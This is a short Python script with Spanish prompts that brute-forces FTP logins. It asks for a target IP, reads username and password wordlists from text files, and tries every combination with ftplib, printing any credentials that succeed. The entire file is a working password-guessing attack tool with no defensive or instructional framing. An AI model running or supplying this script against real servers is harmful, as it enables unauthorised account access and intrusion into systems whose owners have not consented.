import ftplib

def brute(ip, usuario, password):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(usuario, password)
        ftp.quit()
        print("usuario: {}:{}".format(usuario,password))
    except:
        print("no hubo conexion")

def main():

    ip = input("digite la ip: ")
    usuarios = open('usuarios.txt','r')
    usuarios = usuarios.read().split('\n')
    passwords = open('contraseñas.txt','r')
    passwords = passwords.read().split('\n')

    for u in usuarios:
        for p in passwords:
            brute(ip,u,p)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
